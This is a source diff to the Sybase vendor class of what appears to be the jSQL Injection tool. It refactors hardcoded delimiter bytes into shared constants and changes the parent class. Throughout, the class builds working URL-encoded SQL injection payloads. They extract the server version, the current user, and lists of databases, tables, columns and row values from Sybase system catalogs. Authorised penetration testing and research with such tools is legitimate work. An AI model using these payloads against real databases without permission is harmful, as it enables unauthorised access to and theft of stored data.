@@ -1,5 +1,9 @@
 package com.jsql.model.injection.vendor;
 
+import static com.jsql.model.accessible.DataAccess.QTE_SQL;
+import static com.jsql.model.accessible.DataAccess.SEPARATOR_SQL;
+import static com.jsql.model.accessible.DataAccess.TRAIL_SQL;
+
 import java.util.ArrayList;
 import java.util.List;
 
@@ -8,21 +12,21 @@ import com.jsql.model.bean.database.Database;
 import com.jsql.model.bean.database.Table;
 import com.jsql.util.StringUtil;
 
-public class SybaseVendor extends AbstractVendor {
+public class SybaseVendor extends AbstractVendorDefault {
 
     @Override
     public String getSqlInfos() {
         return
             "select+" +
-                "@@version%2B'%04'%2Bdb_name()%2B'%04'%2Buser_name()" +
-                "%2B'%01%03%03%07'r"
+                "@@version%2B'"+ SEPARATOR_SQL +"'%2Bdb_name()%2B'"+ SEPARATOR_SQL +"'%2Buser_name()" +
+                "%2B'"+ TRAIL_SQL +"'r"
         ;
     }
 
     @Override
     public String getSqlDatabases() {
         return
-            "select+rr%2b'%01%03%03%07'r+from+(select+'%04'%2bt.name%2b'%050%04'rr+" +
+            "select+rr%2b'"+ TRAIL_SQL +"'r+from+(select+'"+ SEPARATOR_SQL +"'%2bt.name%2b'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
             "from(select+distinct++name+from+master..sysdatabases)t,(select+distinct+name+from+master..sysdatabases)t1+" +
             "where+t.name>=t1.name+" +
             "group+by+t.name{limit})a";
@@ -31,7 +35,7 @@ public class SybaseVendor extends AbstractVendor {
     @Override
     public String getSqlTables(Database database) {
         return
-            "select+rr%2b'%01%03%03%07'r+from+(select+'%04'%2bt.name%2b'%050%04'rr+" +
+            "select+rr%2b'"+ TRAIL_SQL +"'r+from+(select+'"+ SEPARATOR_SQL +"'%2bt.name%2b'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
             "from(select+distinct+name+from+" + database + "..sysobjects+where+type='U')t,(select+distinct+name+from+" + database + "..sysobjects+where+type='U')t1+" +
             "where+t.name>=t1.name+" +
             "group+by+t.name{limit})a";
@@ -40,7 +44,7 @@ public class SybaseVendor extends AbstractVendor {
     @Override
     public String getSqlColumns(Table table) {
         return
-            "select+rr%2b'%01%03%03%07'r+from+(select+'%04'%2bt.name%2b'%050%04'rr+" +
+            "select+rr%2b'"+ TRAIL_SQL +"'r+from+(select+'"+ SEPARATOR_SQL +"'%2bt.name%2b'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
             "from(select+distinct+c.name+from+" + table.getParent() + "..syscolumns+c+inner+join+" + table.getParent() + "..sysobjects+t+on+c.id=t.id+where+t.name='" + table + "')t,(select+distinct+c.name+from+" + table.getParent() + "..syscolumns+c+inner+join+" + table.getParent() + "..sysobjects+t+on+c.id=t.id+where+t.name='" + table + "')t1+" +
             "where+t.name>=t1.name+" +
             "group+by+t.name{limit})a";
@@ -55,7 +59,7 @@ public class SybaseVendor extends AbstractVendor {
         formatListColumn = "rtrim(ltrim(convert(varchar," + formatListColumn + "%2b'')))";
 
         return
-            "select+rr%2b'%01%03%03%07'r+from+(select+'%04'%2bt.s%2b'%050%04'rr+" +
+            "select+rr%2b'"+ TRAIL_SQL +"'r+from+(select+'"+ SEPARATOR_SQL +"'%2bt.s%2b'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
             "from(select+distinct+" + formatListColumn +"s+from+" + database + ".." + table + ")t,(select+distinct+" + formatListColumn +"s+from+" + database + ".." + table + ")t1+" +
             "where+t.s>=t1.s+" +
             "group+by+t.s{limit})a";
